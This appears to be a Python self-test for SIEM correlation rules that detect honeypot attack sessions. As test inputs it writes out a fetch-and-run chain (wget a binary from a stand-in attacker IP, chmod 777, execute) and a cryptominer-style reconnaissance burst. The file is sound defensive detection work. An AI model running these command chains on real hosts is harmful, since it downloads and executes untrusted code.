#!/usr/bin/env python3
# Self-check for siem_correlation.py's Python reference rules, offline:
# each fires on its real attack shape, respects its window/threshold, and a
# normal admin session trips only the documented false positive.
# Run: python3 scripts/test_siem_correlation.py

import os
import sys
from datetime import datetime, timedelta

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from siem_correlation import CHMOD, DOWNLOAD, full, recon_burst, split_chain  # noqa: E402

T0 = datetime(2026, 9, 1)


def session(*cmds, gap=5):
    return [(T0 + timedelta(seconds=i * gap), c) for i, c in enumerate(cmds)]


def main():
    # Whole-field patterns keep word boundaries without \b.
    assert full(DOWNLOAD, "/bin/busybox wget http://198.51.100.7/x -O x")
    assert not full(DOWNLOAD, "cat wgetrc")
    assert full(CHMOD, "cd /tmp; chmod 777 x86_64")
    assert not full(CHMOD, "chmod 644 notes.txt")

    # Split chain: real shape from the honeypot, then the window and the order.
    assert split_chain(session("wget http://198.51.100.7/iran.x86_64 -O x86_64",
                               "chmod 777 x86_64", "./x86_64"))
    assert not split_chain(session("wget http://198.51.100.7/a", "chmod +x a", gap=121))
    assert not split_chain(session("chmod +x a", "wget http://198.51.100.7/a"))
    assert not split_chain(session("wget http://198.51.100.7/a; chmod +x a; ./a"))  # one line

    # Recon burst: the miner pre-check (9 distinct) fires; a few commands do not.
    burst = ["uname -a", "whoami", "w", "crontab -l", "top", "lscpu | grep Model",
             "free -m | grep Mem", "df -h | head -n 2", "cat /proc/cpuinfo | grep name"]
    assert recon_burst(session(*burst))
    assert not recon_burst(session(*burst[:5]))
    assert not recon_burst(session("wget x", "whoamI", "uptime", "ls", "pwd", "id"))

    # Admin session: only the documented false positive (manual install) fires.
    admin = session("uname -a", "df -h", "free -m",
                    "wget https://example.com/tool-v1.2-linux-amd64",
                    "chmod +x tool-v1.2-linux-amd64",
                    "./tool-v1.2-linux-amd64 --version", "sudo systemctl restart nginx")
    assert split_chain(admin)              # documented: manual installs look like this
    assert not recon_burst(admin)
    print("ok")


if __name__ == "__main__":
    main()
